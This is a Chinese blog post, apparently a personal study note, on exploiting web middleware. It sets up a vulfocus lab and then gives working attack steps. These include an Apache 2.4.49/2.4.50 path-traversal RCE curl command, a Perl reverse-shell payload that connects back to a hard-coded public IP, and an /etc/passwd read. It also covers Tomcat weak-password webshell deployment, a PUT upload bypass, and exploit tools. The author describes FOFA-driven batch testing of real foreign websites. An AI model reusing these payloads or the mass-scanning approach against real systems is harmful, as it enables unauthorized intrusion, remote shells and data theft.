---
layout: post
title: "中间件的安全问题"
date: 2025-03-16 20:15:00 +0800
description: "前言了解常见的中间件 ： IIS 、 apache、nignx、tomcat环境搭建中间件的安全问题主要就是实战以前发现的CVE漏洞环境搭建 上个笔记有如何在kali进行搭建docker准备kali   已经搭建了docker注意这个 ip 0000 是你本机的ip里面有个log。"
keywords: "中间件的安全问题"
categories: ['未分类']
tags: ['安全', '中间件']
artid: "146191158"
image:
    path: https://api.vvhan.com/api/bing?rand=sj&artid=146191158
    alt: "中间件的安全问题"
render_with_liquid: false
featuredImage: https://bing.ee123.net/img/rand?artid=146191158
featuredImagePreview: https://bing.ee123.net/img/rand?artid=146191158
cover: https://bing.ee123.net/img/rand?artid=146191158
image: https://bing.ee123.net/img/rand?artid=146191158
img: https://bing.ee123.net/img/rand?artid=146191158
---

<div class="blog-content-box">
 <div class="article-header-box">
  <div class="article-header">
   <div class="article-title-box">
    <h1 class="title-article" id="articleContentId">
     中间件的安全问题
    </h1>
   </div>
  </div>
 </div>
 <article class="baidu_pl">
  <div class="article_content clearfix" id="article_content">
   <link href="../../assets/css/kdoc_html_views-1a98987dfd.css" rel="stylesheet"/>
   <link href="../../assets/css/ck_htmledit_views-704d5b9767.css" rel="stylesheet"/>
   <div class="htmledit_views" id="content_views">
    <p>
     前言
    </p>
    <p>
     了解常见的中间件 ： IIS 、 apache、nignx、tomcat
    </p>
    <p>
     环境搭建中间件的安全问题主要就是实战以前发现的CVE漏洞
    </p>
    <p>
     环境搭建 上个笔记有如何在kali进行搭建docker
    </p>
    <p>
     准备kali   已经搭建了docker
    </p>
    <pre><code>sudo docker pull vulfocus/vulfocus:latest 
拉取镜像
</code></pre>
    <pre><code>docker run -d -p 80:80 -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=xxxx vulfocus/vulfocus
启动镜像    run是运行   -d 在后台   -p 端口   -v是进行挂载  ： 后边是容器的路径   意思就是把容器的内容映射到本地机目录上    而  -e是设置容器的环境变量</code></pre>
    <p>
     注意这个 ip 0000 是你本机的ip
    </p>
    <p>
     <img alt="" height="461" src="https://i-blog.csdnimg.cn/direct/0912d1b6f2f348899afbca7facc2d7a3.png" width="1322"/>
    </p>
    <p>
     里面有个log
    </p>
    <h3>
     apache框架下有利于价值的CVE
    </h3>
    <h4>
     1、RCE命令执行
    </h4>
    <p>
     应用于apache  2.4.49-2.4.50
    </p>
    <p>
     我们利用漏洞之前先找到这个漏洞的中间件的版本
     <img alt="" height="700" src="https://i-blog.csdnimg.cn/direct/543a9ec3023541889ac770adf711cfa6.png" width="1239"/>
    </p>
    <p>
     正好是在这个版本的
     <img alt="" height="577" src="https://i-blog.csdnimg.cn/direct/d380d36c7521458e87c3c7de67b80944.png" width="942"/>
    </p>
    <p>
     利用exp进行操作
    </p>
    <pre><code>使用服务器进行curl请求
curl --data "echo;id" 'http://xx.xx.xx.xx/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh'


抓包改包修改
POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh 
echo;perl -e 'use Socket;$i="47.94.236.117";$p=5566;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");};'
</code></pre>
    <p>
     利用exp进行操作
     <img alt="" height="368" src="https://i-blog.csdnimg.cn/direct/85a2364a883945cb94483d10a06c25a6.png" width="764"/>
    </p>
    <p>
     这个rce框架漏洞我们可以进行全网搜   先使用 fafoviewer生成使用fafo搜索的信息可以去批量的测试（这里测试的都是外国网站）
    </p>
    <p>
     fofa语法：
     <img alt="" height="700" src="https://i-blog.csdnimg.cn/direct/886a34c9d9a54b24b2ff78060f639b85.png" width="1100"/>
    </p>
    <p>
     这边只导出10个是因为我设置的最大导出
     <img alt="" height="423" src="https://i-blog.csdnimg.cn/direct/68f776cd6a5140cda318a6a68f051852.png" width="1010"/>
    </p>
    <p>
    </p>
    <h4>
     2、目录穿越漏洞
    </h4>
    <p>
     <img alt="" height="932" src="https://i-blog.csdnimg.cn/direct/877f45568bea4ce08e21de79a4f5b10e.png" width="1186"/>
    </p>
    <pre><code>curl -v --path-as-is 'http://xx.xx.xx.xx/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd'
GET /icons/.%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd
</code></pre>
    <p>
     <img alt="" height="350" src="https://i-blog.csdnimg.cn/direct/a66d5f23db5545a68b568d260108ed68.png" width="694"/>
    </p>
    <p>
     可以直接访问
    </p>
    <h3>
     tomcat框架
    </h3>
    <p>
     1、弱口令爆破
    </p>
    <p>
     这个就是利用tomcat登录弹窗的弱密码
     <img alt="" height="869" src="https://i-blog.csdnimg.cn/direct/6b3e3d7bfc554c35bd3cfa6efe862b9c.png" width="1507"/>
    </p>
    <p>
     之后需要getshell
    </p>
    <p>
     骚操作： 冰蝎生成一个jar木马
    </p>
    <p>
     <img alt="" height="466" src="https://i-blog.csdnimg.cn/direct/b73d6e988a284733983bdf076b5b12d9.png" width="1078"/>
    </p>
    <p>
     <img alt="" height="139" src="https://i-blog.csdnimg.cn/direct/8d5e7cad1c21401286a6c989701f0601.png" width="1268"/>
    </p>
    <p>
     和gzl有很明显的差别就是开头没有system
    </p>
    <p>
     <img alt="" height="120" src="https://i-blog.csdnimg.cn/direct/cd33f22fdba54ce9bc3fb20089b2fb30.png" width="539"/>
    </p>
    <p>
     这里让我们上传的是  war文件
    </p>
    <p>
     <img alt="" height="349" src="https://i-blog.csdnimg.cn/direct/5822e407935c45dea2e8def6d7d8ca7c.png" width="730"/>
    </p>
    <p>
     <img alt="" height="221" src="https://i-blog.csdnimg.cn/direct/038d3df137744e23a22067c16c91a163.png" width="260"/>
    </p>
    <p>
     压缩一下改名为 war
     <img alt="" height="138" src="https://i-blog.csdnimg.cn/direct/000d5795d6b44108b89d295743d8da8e.png" width="473"/>
    </p>
    <p>
     <img alt="" height="157" src="https://i-blog.csdnimg.cn/direct/7845ffdffd3b4878b3e1a64b54d271f9.png" width="806"/>
    </p>
    <pre><code>http://192.168.248.132:11374/shell/shell.jsp</code></pre>
    <p>
     连接上就行
    </p>
    <p>
     2、文件上传漏洞
    </p>
    <div>
    </div>
    <div>
     <p style="margin-left:0; margin-right:0; text-align:left">
      <span style="color:#000000">
       Apache Tomcat 7.0.0 - 7.0.79
      </span>
     </p>
     <p style="margin-left:0; margin-right:0; text-align:left">
      <img alt="" height="636" src="https://i-blog.csdnimg.cn/direct/33d869d0ce054f6680ba694ec70e63d9.png" width="1029"/>
     </p>
     <p style="margin-left:0; margin-right:0; text-align:left">
      <img alt="" height="296" src="https://i-blog.csdnimg.cn/direct/02a831d022c84bd18006fa0bf8f3ac87.png" width="575"/>
     </p>
     <p style="margin-left:0; margin-right:0; text-align:left">
      <img alt="" height="128" src="https://i-blog.csdnimg.cn/direct/267b8ef60a534096bdb9f5b6d776c479.png" width="422"/>
     </p>
     <p style="margin-left:0; margin-right:0; text-align:left">
      然后复制木马的内容到这个请求数据包的下面
      <img alt="" height="781" src="https://i-blog.csdnimg.cn/direct/4e8be0e0e36b4b05bae006991ba9ec55.png" width="1403"/>
     </p>
     <p style="margin-left:0; margin-right:0; text-align:left">
      发现报错404？？？？？？什么情况   是因为我们后边的http把这个1.jsp当路径处理了但是这个网站内部是没有这个的所以报错了
     </p>
     <p style="margin-left:0; margin-right:0; text-align:left">
      绕过方式 ：   /xx.jsp/          //进行包裹
     </p>
     <p style="margin-left:0; margin-right:0; text-align:left">
      <img alt="" height="243" src="https://i-blog.csdnimg.cn/direct/a60e6aac8b3146feadcaf36477d8b0bb.png" width="1244"/>
     </p>
     <p style="margin-left:0; margin-right:0; text-align:left">
      就可以进行连接了
     </p>
     <p style="margin-left:0; margin-right:0; text-align:left">
      3、文件包含漏洞
     </p>
     <div>
     </div>
     <div>
      <p style="margin-left:0; margin-right:0; text-align:left">
       <span style="color:#000000">
        Tomcat 6.*
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:left">
       <span style="color:#000000">
        Tomcat 7.* &lt; 7.0.100
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:left">
       <span style="color:#000000">
        Tomcat 8.* &lt; 8.5.51
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:left">
       <span style="color:#000000">
        Tomcat 9.* &lt; 9.0.31
       </span>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:left">
       <span style="color:#000000">
        使用
       </span>
       <img alt="" height="603" src="https://i-blog.csdnimg.cn/direct/17f1d818db0843acb7092d939ebfbcc7.png" width="1144"/>
      </p>
      <p style="margin-left:0; margin-right:0; text-align:left">
       这个工具是py2开发的
      </p>
      <div>
      </div>
      <div>
       <p style="margin-left:0; margin-right:0; text-align:left">
        <span style="color:#000000">
         https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi
        </span>
       </p>
       <p style="margin-left:0; margin-right:0; text-align:left">
       </p>
      </div>
     </div>
     <h3 style="margin-left:0px; margin-right:0px; text-align:left">
      weblogic
     </h3>
     <p>
      没什么好说的就是工具梭哈
     </p>
     <p>
      <img alt="" height="404" src="https://i-blog.csdnimg.cn/direct/b3690f4303d54280904dfaa0bca20cc3.png" width="854"/>
     </p>
     <p>
      天狐工具包wx搜 狐狸即可下载
     </p>
     <p>
      <img alt="" height="263" src="https://i-blog.csdnimg.cn/direct/3e8d7cc6ac53495a8f5d46872f9298d7.png" width="758"/>
     </p>
     <p>
      点击检查  如果不知道是哪个CVE就一把梭   知道会快很多
     </p>
    </div>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f:672e6373646e2e6e65742f323330315f38313135353339312f:61727469636c652f64657461696c732f313436313931313538" class_="artid" style="display:none">
 </p>
</div>


